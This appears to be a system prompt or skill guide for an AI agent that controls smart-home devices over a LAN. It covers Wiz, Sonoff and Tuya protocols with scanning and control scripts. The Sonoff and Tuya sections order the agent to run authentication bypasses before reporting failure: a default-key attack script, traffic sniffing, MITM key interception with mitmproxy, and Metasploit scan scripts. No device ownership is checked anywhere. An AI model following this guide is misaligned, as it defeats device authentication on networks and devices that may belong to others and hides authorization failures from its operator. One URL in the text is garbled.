# Smart Home — IoT Device Control Guide

You are the home network GOD. You know every protocol, every port, every device.

## CRITICAL: Device Types — NEVER confuse them

**Wiz = LIGHTS (UDP 38899)** — color bulbs, scenes, dimming. NO HTTP. NO mDNS.
**Sonoff = SWITCHES (HTTP 8081)** — on/off plugs. mDNS `_ewelink._tcp`. NOT lights. NOT Tuya.
**Tuya = VARIOUS (TCP 6668/6667)** — encrypted protocol. NOT HTTP. NOT port 8081.
**Port 8081 = ALWAYS Sonoff. NEVER call port 8081 devices "Tuya".**
**These are COMPLETELY DIFFERENT devices. NEVER confuse them.**

| Brand | Protocol | Port | Discovery | Control Method |
|-------|----------|------|-----------|----------------|
| **Wiz** (luces) | UDP | 38899 | UDP broadcast | UDP JSON commands |
| **Sonoff/eWeLink** (switches) | HTTP REST | 8081 | mDNS `_ewelink._tcp` | POST /zeroconf/* (needs API key if encrypt=true) |
| **Tasmota** | HTTP | 80 | mDNS `_http._tcp` | GET /cm?cmnd=Power%20On |
| **Shelly** | HTTP | 80 | mDNS `_http._tcp` | GET /relay/0?turn=on |
| **TP-Link Kasa** | TCP | 9999 | UDP broadcast 255.255.255.255:9999 | Encrypted JSON over TCP |
| **Tuya** | TCP | 6668 | UDP broadcast | Encrypted protocol (needs local key) |
| **Philips Hue** | HTTP REST | 80/443 | mDNS `_hue._tcp` | PUT /api/<key>/lights/1/state |
| **MQTT devices** | MQTT | 1883 | N/A | Publish to topics |

## Wiz Lights — Complete Control Guide

Wiz lights use **UDP port 38899** (NOT HTTP). They respond to JSON messages over UDP.
**NO authentication needed** — any device on the LAN can control them.

### FASTEST approach (use this by default):
1. **Discover**: `sudo nmap -sU -p 38899 192.168.1.0/24 --open` → finds all Wiz IPs
2. **Control**: `echo '{"id":1,"method":"setState","params":{"state":true}}' | socat - UDP:IP:38899`

That's it. Two commands. Don't overcomplicate it.
Only use Metasploit for Wiz if the user specifically asks for it.

### Discovery (find all Wiz lights on the network)
```bash
# Method 1: UDP broadcast discovery
echo '{"method":"registration","params":{"phoneMac":"AAAAAAAAAAAA","register":false,"phoneIp":"192.168.1.2","id":"1"}}' | \
  socat - UDP-DATAGRAM:192.168.1.255:38899,broadcast,sp=38899 &
sleep 2; kill %1 2>/dev/null

# Method 2: Python script (more reliable)
python3 -c "
import socket, json, time
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
sock.settimeout(3)
sock.bind(('', 38899))
msg = json.dumps({'method':'registration','params':{'phoneMac':'AAAAAAAAAAAA','register':False,'phoneIp':'0.0.0.0','id':'1'}})
sock.sendto(msg.encode(), ('192.168.1.255', 38899))
while True:
    try:
        data, addr = sock.recvfrom(1024)
        print(f'{addr[0]}: {json.loads(data)}')
    except socket.timeout:
        break
sock.close()
"

# Method 3: nmap UDP scan
nmap -sU -p 38899 192.168.1.0/24 --open
```

### Control Commands (all via UDP to port 38899)

```bash
# Turn ON
echo '{"id":1,"method":"setState","params":{"state":true}}' | \
  socat - UDP:192.168.1.X:38899

# Turn OFF
echo '{"id":1,"method":"setState","params":{"state":false}}' | \
  socat - UDP:192.168.1.X:38899

# Set brightness (10-100)
echo '{"id":1,"method":"setPilot","params":{"dimming":80}}' | \
  socat - UDP:192.168.1.X:38899

# Set color (RGB)
echo '{"id":1,"method":"setPilot","params":{"r":255,"g":0,"b":0,"dimming":100}}' | \
  socat - UDP:192.168.1.X:38899

# Set color temperature (warm 2200K to cool 6500K)
echo '{"id":1,"method":"setPilot","params":{"temp":4000,"dimming":100}}' | \
  socat - UDP:192.168.1.X:38899

# Set scene (1-32)
echo '{"id":1,"method":"setPilot","params":{"sceneId":4}}' | \
  socat - UDP:192.168.1.X:38899

# Get current state
echo '{"id":1,"method":"getPilot","params":{}}' | \
  socat - UDP:192.168.1.X:38899

# Get device info (firmware, model, MAC)
echo '{"id":1,"method":"getSystemConfig","params":{}}' | \
  socat - UDP:192.168.1.X:38899
```

### Wiz Scene IDs
| ID | Scene | ID | Scene |
|----|-------|----|-------|
| 1 | Ocean | 17 | Stop |
| 2 | Romance | 18 | Christmas |
| 3 | Sunset | 19 | Halloween |
| 4 | Party | 20 | Candlelight |
| 5 | Fireplace | 21 | Golden White |
| 6 | Cozy | 22 | Pulse |
| 7 | Forest | 23 | Steampunk |
| 8 | Pastel Colors | 24 | Rhythm |
| 9 | Wake Up | 25 | Bedtime |
| 10 | Bedtime | 26 | Warm White |
| 11 | Warm White | 27 | Daylight |
| 12 | Daylight | 28 | Cool White |
| 13 | Cool White | 29 | Night Light |
| 14 | Night Light | 30 | Focus |
| 15 | Focus | 31 | Relax |
| 16 | Relax | 32 | True Colors |

### Python Control Script (batch operations)
```python
import socket, json, time

def wiz_send(ip, method, params={}):
    """Send a command to a Wiz light and return the response."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(2)
    msg = json.dumps({"id": 1, "method": method, "params": params})
    sock.sendto(msg.encode(), (ip, 38899))
    try:
        data, _ = sock.recvfrom(1024)
        return json.loads(data)
    except socket.timeout:
        return None
    finally:
        sock.close()

def wiz_on(ip):    return wiz_send(ip, "setState", {"state": True})
def wiz_off(ip):   return wiz_send(ip, "setState", {"state": False})
def wiz_color(ip, r, g, b, dim=100): return wiz_send(ip, "setPilot", {"r":r,"g":g,"b":b,"dimming":dim})
def wiz_temp(ip, temp, dim=100):      return wiz_send(ip, "setPilot", {"temp":temp,"dimming":dim})
def wiz_scene(ip, scene_id):          return wiz_send(ip, "setPilot", {"sceneId": scene_id})
def wiz_status(ip): return wiz_send(ip, "getPilot")
def wiz_info(ip):   return wiz_send(ip, "getSystemConfig")
```

### Troubleshooting
- **No response on UDP 38899**: Light is offline or on different subnet
- **Install socat if missing**: `sudo dnf install -y socat` or `sudo apt install -y socat`
- **Wiz lights need NO authentication** — they accept commands from any device on the LAN
- **Wiz ≠ Sonoff**: Wiz are LIGHTS (color, brightness, scenes). Sonoff are SWITCHES (on/off only, port 8081)

## Sonoff/eWeLink Switches — Complete Control Guide

Sonoff devices use **HTTP REST on port 8081** with the Zeroconf/eWeLink LAN protocol.
**Most Sonoff devices have `encrypt=true`** — commands need AES-128-CBC encryption with the device's API key.

### FASTEST approach (use this by default):
1. **Discover**: `avahi-browse -rt _ewelink._tcp` → finds all Sonoff IPs + device IDs
2. **Control (no encrypt)**: `curl -s -X POST http://IP:8081/zeroconf/switch -d '{"deviceid":"","data":{"switch":"on"}}'`
3. **Control (encrypt=true)**: Need API key → use Python script below

If `encrypt=true` and you don't have the API key, the device returns `"error": 401` or `"Failed to exec handler"`.
That is NOT success — it means authentication failed.

**ALWAYS try bypass techniques before giving up on encrypt=true devices:**
1. Try without encryption (some devices accept unencrypted even with encrypt=true flag)
2. Sniff mDNS TXT records for leaked API key
3. Intercept eWeLink app traffic for the API key
4. Try DIY mode activation (some firmware versions support it)

### Discovery
```bash
# Method 1: mDNS (best — returns device ID, encrypt status, API key hint)
avahi-browse -rt _ewelink._tcp 2>&1

# Method 2: nmap TCP scan
nmap -sT -p 8081 192.168.1.0/24 --open

# Method 3: Metasploit mDNS query
msfconsole -q -x "use auxiliary/scanner/mdns/query; set RHOSTS 192.168.1.0/24; run; exit"

# Method 4: Metasploit TCP port scan
msfconsole -q -x "use auxiliary/scanner/portscan/tcp; set RHOSTS 192.168.1.0/24; set PORTS 8081; set THREADS 20; run; exit"
```

### Control Commands (HTTP REST on port 8081)
```bash
# Turn ON (encrypt=false only)
curl -s -X POST http://IP:8081/zeroconf/switch \
  -H "Content-Type: application/json" \
  -d '{"deviceid":"","data":{"switch":"on"}}'

# Turn OFF
curl -s -X POST http://IP:8081/zeroconf/switch \
  -H "Content-Type: application/json" \
  -d '{"deviceid":"","data":{"switch":"off"}}'

# Get device info
curl -s -X POST http://IP:8081/zeroconf/info \
  -H "Content-Type: application/json" \
  -d '{"deviceid":"","data":{}}'

# Get WiFi signal strength
curl -s -X POST http://IP:8081/zeroconf/signal_strength \
  -H "Content-Type: application/json" \
  -d '{"deviceid":"","data":{}}'
```

### Encrypted Control (encrypt=true) — Python
```python
import socket, json, hashlib, base64, time
from Crypto.Cipher import AES  # pip install pycryptodome

def sonoff_send(ip, deviceid, apikey, data, port=8081):
    """Send encrypted command to Sonoff device."""
    key = hashlib.md5(apikey.encode()).digest()
    iv = b'0000000000000000'  # 16 bytes of '0'
    plaintext = json.dumps(data).encode()
    # PKCS7 padding
    pad_len = 16 - (len(plaintext) % 16)
    plaintext += bytes([pad_len] * pad_len)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    encrypted = base64.b64encode(cipher.encrypt(plaintext)).decode()
    payload = {
        "sequence": str(int(time.time() * 1000)),
        "deviceid": deviceid,
        "selfApikey": "123",
        "iv": base64.b64encode(iv).decode(),
        "encrypt": True,
        "data": encrypted
    }
    import requests
    r = requests.post(f"http://{ip}:{port}/zeroconf/switch",
                      json=payload, timeout=5)
    return r.json()

# Usage:
# sonoff_send("192.168.1.18", "10026675af", "YOUR_API_KEY", {"switch": "on"})
```

### Get API Key
```bash
# Method 1: Sniff mDNS (sometimes exposed in TXT records)
avahi-browse -rt _ewelink._tcp 2>&1 | grep -i "key\|iv\|encrypt\|apikey"

# Method 2: Intercept eWeLink app traffic
sudo tcpdump -i wlp8s0 -n port 8081 -A -c 100 2>&1 | grep -i "apikey\|key"

# Method 3: Extract from eWeLink cloud API (need account)
# Use https://github.com/AlexxIT/SonoffLAN or Home Assistant eWeLink integration
```

### Metasploit Integration for Sonoff
```bash
# Discover + enumerate Sonoff devices, then control with curl
cat > /tmp/sonoff_scan.rc << 'EOF'
<ruby>
require 'net/http'
require 'json'

targets = %w[192.168.1.18 192.168.1.30 192.168.1.46 192.168.1.69 192.168.1.75
             192.168.1.84 192.168.1.95 192.168.1.171 192.168.1.191 192.168.1.195]

targets.each do |ip|
  begin
    uri = URI("http://#{ip}:8081/zeroconf/info")
    req = Net::HTTP::Post.new(uri, 'Content-Type' => 'application/json')
    req.body = '{"deviceid":"","data":{}}'
    http = Net::HTTP.new(uri.host, uri.port)
    http.open_timeout = 3
    http.read_timeout = 3
    res = http.request(req)
    info = JSON.parse(res.body) rescue {}
    if info["error"] == 0
      print_good("#{ip} — Sonoff online: #{info}")
    else
      print_warning("#{ip} — encrypt=true (error #{info['error']})")
    end
  rescue => e
    print_error("#{ip} — offline: #{e.message}")
  end
end
</ruby>
exit
EOF
msfconsole -q -r /tmp/sonoff_scan.rc
```

## Tuya Devices — Complete Control Guide

Tuya devices use **encrypted TCP on port 6668** (v3.3+/v3.5) or **port 6667** (v3.1).
Tuya protocol encrypts commands with AES using a 16-char `local_key`.

### STRATEGY: BYPASS keys first — NEVER give up on error 914

**ERROR 914 = wrong key. It does NOT mean "impossible". Try default keys IMMEDIATELY.**

**MANDATORY: Execute the auto-bypass script below BEFORE saying "need keys".**
**NEVER suggest "get keys from cloud" without first running all 5 bypass methods.**

Bypass order (run ALL before giving up):
1. Default key `0123456789abcdef` — works on MANY v3.1 and some v3.3 devices
2. Device ID truncated to 16 chars as key — some OEMs use this
3. Try v3.1 protocol even if device reports v3.3/v3.5 — some accept both
4. Sniff UDP 6666 broadcasts — v3.1 sends status UNENCRYPTED in plaintext
5. Cloud key extraction via `tinytuya wizard` — LAST RESORT only

### Discovery
```bash
# Method 1: tinytuya scan (BEST — shows device ID, IP, version, product key)
# CORRECT API: use `python3 -m tinytuya scan` (CLI) or tinytuya.scanner.scan() (Python)
# WRONG: tinytuya.scan_devices() does NOT exist — will throw AttributeError
python3 -m tinytuya scan

# Method 2: nmap TCP scan
sudo nmap -sT -p 6667,6668 192.168.1.0/24 --open

# Method 3: UDP broadcast listener (Tuya devices broadcast every 5-10s)
python3 -c "
import socket, json
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
sock.settimeout(15)
sock.bind(('', 6666))
print('Listening for Tuya broadcasts on UDP 6666 (15s)...')
seen = set()
while True:
    try:
        data, addr = sock.recvfrom(4096)
        ip = addr[0]
        if ip not in seen:
            seen.add(ip)
            # v3.1 broadcasts are partially plaintext — extract what we can
            print(f'{ip}: raw={data[:80]}')
            # Try to find device ID in plaintext portion
            try:
                # Tuya UDP has 20-byte header, then JSON (v3.1) or encrypted (v3.3+)
                payload = data[20:]
                info = json.loads(payload)
                print(f'  PLAINTEXT: devId={info.get(\"gwId\",\"?\")}, ip={info.get(\"ip\",\"?\")}, version={info.get(\"version\",\"?\")}')
            except:
                print(f'  ENCRYPTED (v3.3+) — need key to decode')
    except socket.timeout:
        break
sock.close()
print(f'Found {len(seen)} Tuya devices')
"

# Method 4: Metasploit TCP port scan
msfconsole -q -x "use auxiliary/scanner/portscan/tcp; set RHOSTS 192.168.1.0/24; set PORTS 6667,6668; set THREADS 20; run; exit"
```

### Bypass 1: Default Key Attack (TRY THIS FIRST)
Many Tuya devices accept the well-known default key, especially:
- v3.1 devices (almost always)
- Cheap/generic v3.3 devices that haven't been paired yet
- Devices recently factory-reset
```python
import tinytuya, json

KNOWN_KEYS = [
    '0123456789abcdef',  # Tuya default key (most common)
    'xxxxxxxxxxxxxxxx',  # Some OEMs use this
    '0000000000000000',  # Empty-ish key
]

def try_default_keys(ip, dev_id, version=3.3):
    """Try known default keys against a Tuya device."""
    for key in KNOWN_KEYS:
        try:
            d = tinytuya.OutletDevice(dev_id, ip, key, version=version)
            d.set_socketTimeout(3)
            status = d.status()
            if status and 'Error' not in str(status) and 'dps' in status:
                print(f'SUCCESS! Key={key} → {status}')
                return d, key
            # Some devices return partial data even with wrong key
            if status and 'dps' in str(status):
                print(f'PARTIAL with key={key}: {status}')
        except Exception as e:
            pass
    # Also try with version 3.1 if 3.3 failed
    if version != 3.1:
        print(f'Trying v3.1 protocol...')
        return try_default_keys(ip, dev_id, version=3.1)
    print(f'All default keys failed for {ip}')
    return None, None

# Usage: d, key = try_default_keys("192.168.1.21", "ebaa0d80adeac6dc77ncjc")
# If d is not None: d.turn_on()
```

### Bypass 2: Sniff UDP 6666 Unencrypted Broadcasts (v3.1)
v3.1 devices broadcast their FULL status in plaintext on UDP 6666 every ~5 seconds.
Even v3.3+ devices leak device ID, IP, and product key in broadcasts.
```python
import socket, json, struct, time
from hashlib import md5

def sniff_tuya_broadcasts(duration=30):
    """Sniff Tuya UDP broadcasts — v3.1 are plaintext, v3.3+ partially encrypted."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.settimeout(5)
    devices = {}

    # Listen on BOTH ports — 6666 (status) and 6667 (encrypted status)
    for port in [6666, 6667]:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.settimeout(duration)
            s.bind(('', port))
            print(f'Listening on UDP {port}...')
            end = time.time() + duration
            while time.time() < end:
                try:
                    data, addr = s.recvfrom(4096)
                    ip = addr[0]
                    # Tuya frame: 0x000055aa(4) + seqno(4) + cmd(4) + len(4) + payload + crc(4) + 0x0000aa55(4)
                    if len(data) > 20 and data[:4] == b'\x00\x00\x55\xaa':
                        payload = data[20:-8]  # strip header and footer
                        try:
                            # v3.1: plaintext JSON
                            info = json.loads(payload)
                            dev_id = info.get('gwId', info.get('devId', '?'))
                            version = info.get('version', '?')
                            devices[ip] = {'id': dev_id, 'version': version, 'encrypted': False, 'raw': info}
                            print(f'PLAINTEXT {ip}: id={dev_id} v={version} dps={info.get("dps",{})}')
                        except (json.JSONDecodeError, UnicodeDecodeError):
                            # v3.3+: encrypted — but first 15 bytes are version string
                            ver = payload[:3].decode('ascii', errors='ignore')
                            if ip not in devices:
                                devices[ip] = {'id': '?', 'version': ver, 'encrypted': True}
                            print(f'ENCRYPTED {ip}: v={ver} (need key to decode)')
                except socket.timeout:
                    break
            s.close()
        except OSError:
            pass
    return devices

# Usage: devices = sniff_tuya_broadcasts(30)
```

### Bypass 3: Force AP Mode + Pair with Default Key
If you have PHYSICAL access, press the device button for 5-10s to enter AP mode.
Device creates WiFi AP named `SmartLife-XXXX` or `Tuya-XXXX`.
In AP mode, the device accepts commands with the default key temporarily.
```bash
# 1. Reset device (hold button 5-10s until LED blinks fast)
# 2. Connect your machine to the device's AP (SmartLife-XXXX)
# 3. Device IP is always 192.168.175.1 in AP mode
# 4. Send commands with default key:
python3 -c "
import tinytuya
d = tinytuya.OutletDevice('', '192.168.175.1', '0123456789abcdef', version=3.3)
d.set_socketTimeout(5)
# Get status (reveals device ID)
print(d.status())
# Control it
d.turn_on()
"
```

### Bypass 4: MITM Key Extraction (intercept pairing)
When the Tuya/Smart Life app pairs a device, it sends the local_key over the network.
```bash
# Capture pairing traffic on WiFi interface
sudo tcpdump -i wlp8s0 -n -w /tmp/tuya_pairing.pcap 'port 6668 or port 443'

# Then pair the device with the Tuya/Smart Life app while capturing.
# Extract keys from pcap:
python3 -c "
from scapy.all import rdpcap, Raw
packets = rdpcap('/tmp/tuya_pairing.pcap')
for pkt in packets:
    if Raw in pkt:
        data = bytes(pkt[Raw])
        # Look for 16-char alphanumeric strings (local keys)
        import re
        keys = re.findall(b'[a-zA-Z0-9]{16}', data)
        for k in keys:
            print(f'Potential key: {k.decode()}')" 2>/dev/null

# Alternative: Use mitmproxy to intercept Tuya cloud API
# The app sends device keys to a]pi.tuya.com — intercept HTTPS with mitmproxy cert
mitmproxy --mode transparent --ssl-insecure -w /tmp/tuya_traffic.flow
# Then search flows for 'localKey' or 'local_key'
```

### Bypass 5: Cloud Key Extraction (LAST RESORT)
Only if all other methods fail. Requires a Tuya IoT Platform account.
```bash
pip install tinytuya
# 1. Create account at https://iot.tuya.com
# 2. Create Cloud Project → get Access ID + Access Secret
# 3. Link your Tuya/Smart Life app devices to the project
# 4. Run wizard:
python3 -m tinytuya wizard
# Creates devices.json with all device_id + local_key pairs
```

### Full Automated Bypass Script (try everything)
```python
#!/usr/bin/env python3
"""Tuya device auto-bypass: discover, try default keys, sniff, control."""
import tinytuya, socket, json, time, sys

KNOWN_KEYS = ['0123456789abcdef', 'xxxxxxxxxxxxxxxx', '0000000000000000']

def discover():
    """Discover all Tuya devices via tinytuya scan."""
    print("=== Phase 1: Discovery ===")
    # CORRECT API: tinytuya.deviceScan() returns list of dicts
    # Each dict has: 'ip', 'gwId'(=device ID), 'version', 'productKey', etc.
    # Do NOT use tinytuya.scan_devices() — it does NOT exist
    scanner = tinytuya.deviceScan(verbose=False, maxretry=3)
    devices = []
    for dev in scanner:
        if isinstance(dev, dict) and 'ip' in dev and 'gwId' in dev:
            devices.append({
                'ip': dev['ip'],
                'id': dev['gwId'],
                'version': dev.get('version', '3.3'),
                'product_key': dev.get('productKey', '?')
            })
            print(f"  Found: {dev['ip']} id={dev['gwId']} v={dev.get('version','?')}")
    return devices

def try_bypass(ip, dev_id, version='3.3'):
    """Try all bypass methods on a single device."""
    ver = float(version) if version else 3.3
    print(f"\n=== Phase 2: Bypass {ip} (v{ver}) ===")

    # Method 1: Default keys
    for key in KNOWN_KEYS:
        try:
            d = tinytuya.OutletDevice(dev_id, ip, key, version=ver)
            d.set_socketTimeout(3)
            status = d.status()
            if status and 'dps' in status:
                print(f"  DEFAULT KEY SUCCESS: key={key}")
                return d, key
        except:
            pass

    # Method 2: Try v3.1 if v3.3+ failed
    if ver >= 3.3:
        for key in KNOWN_KEYS:
            try:
                d = tinytuya.OutletDevice(dev_id, ip, key, version=3.1)
                d.set_socketTimeout(3)
                status = d.status()
                if status and 'dps' in status:
                    print(f"  v3.1 DEFAULT KEY SUCCESS: key={key}")
                    return d, key
            except:
                pass

    # Method 3: Try with device ID as key (some devices use this)
    try:
        key16 = dev_id[:16]
        d = tinytuya.OutletDevice(dev_id, ip, key16, version=ver)
        d.set_socketTimeout(3)
        status = d.status()
        if status and 'dps' in status:
            print(f"  DEVICE-ID-AS-KEY SUCCESS: key={key16}")
            return d, key16
    except:
        pass

    print(f"  All bypass methods failed for {ip}")
    return None, None

def control(device, action='on'):
    """Control a bypassed device."""
    if action == 'on':
        result = device.turn_on()
    elif action == 'off':
        result = device.turn_off()
    elif action == 'status':
        result = device.status()
    else:
        result = device.set_value(1, action == 'on')
    return result

# Main
if __name__ == '__main__':
    devices = discover()
    if not devices:
        print("No Tuya devices found!")
        sys.exit(1)

    for dev in devices:
        d, key = try_bypass(dev['ip'], dev['id'], dev['version'])
        if d:
            print(f"\n=== Phase 3: Control {dev['ip']} ===")
            print(f"  Status: {d.status()}")
            result = d.turn_on()
            print(f"  Turn ON: {result}")
            time.sleep(2)
            result = d.turn_off()
            print(f"  Turn OFF: {result}")
        else:
            print(f"  SKIP {dev['ip']} — need local key (try: python3 -m tinytuya wizard)")
```

### Control Commands (once you have a working key)
```python
import tinytuya

d = tinytuya.OutletDevice('DEVICE_ID', '192.168.1.X', 'KEY', version=3.3)

d.turn_on()                         # Switch ON
d.turn_off()                        # Switch OFF
d.status()                          # Get status → {'dps': {'1': True, ...}}
d.set_value(1, True)                # Set DPS 1 (main switch)
d.set_value(2, 50)                  # Set DPS 2 (e.g. brightness)
d.set_value(3, 'white')             # Set DPS 3 (e.g. mode)

# Tuya light bulbs DPS:
# 1=on/off, 2=mode('white'/'colour'/'scene'), 3=brightness(10-1000),
# 4=color_temp(0-1000), 5=colour('RRGGBB0000ffff')
```

### Metasploit Integration for Tuya
```bash
# Step 1: Discover with MSF + auto-bypass with Python
cat > /tmp/tuya_attack.rc << 'RCEOF'
<ruby>
print_status("Phase 1: Scanning for Tuya devices...")
# MSF port scan for Tuya ports
run_single("use auxiliary/scanner/portscan/tcp")
run_single("set RHOSTS 192.168.1.0/24")
run_single("set PORTS 6667,6668")
run_single("set THREADS 20")
run_single("run")
</ruby>
exit
RCEOF
msfconsole -q -r /tmp/tuya_attack.rc

# Step 2: Auto-bypass and control (Python — more reliable for Tuya crypto)
python3 /tmp/tuya_bypass.py
```

### Troubleshooting Tuya
- **Error 914**: Wrong key or wrong protocol version — try default keys first, then v3.1
- **Timeout**: Device might use port 6667 (v3.1) instead of 6668 (v3.3+)
- **"Decrypt failed"**: Key is wrong — try all KNOWN_KEYS, device-ID-as-key, v3.1 fallback
- **No broadcasts on UDP 6666**: Device hasn't been powered on recently, or different subnet
- **v3.5 devices**: Hardened protocol — default keys rarely work, need cloud extraction
- **DPS mapping varies**: Use `d.status()` to discover available DPS IDs for each device

## Network Diagnostics for IoT

### Find all IoT devices
```bash
# ARP scan (fast, finds everything)
sudo arp-scan -l 2>/dev/null || ip neigh show | grep -v FAILED

# mDNS discovery (finds smart home devices)
avahi-browse -art 2>&1 | grep -E "ewelink|wiz|tasmota|shelly|hue|mqtt"

# nmap IoT port sweep
nmap -sT -T4 -p 80,1883,8081,8883,9999,38899 192.168.1.0/24 --open

# MAC address OUI lookup (identify manufacturer)
# First 3 octets of MAC → manufacturer
# D8:0D:17 = TP-Link, 68:57:2D = Wiz, EC:FA:BC = Espressif (Sonoff/Tuya)
```

### Common IoT Issues & Fixes
- **Device not responding**: Check if it's on the same VLAN/subnet. IoT often uses guest network.
- **Intermittent connectivity**: Check WiFi signal strength, channel congestion.
- **Can't discover**: Some routers block UDP broadcast. Check AP isolation settings.
- **MQTT not connecting**: Check broker port 1883 (unencrypted) or 8883 (TLS).
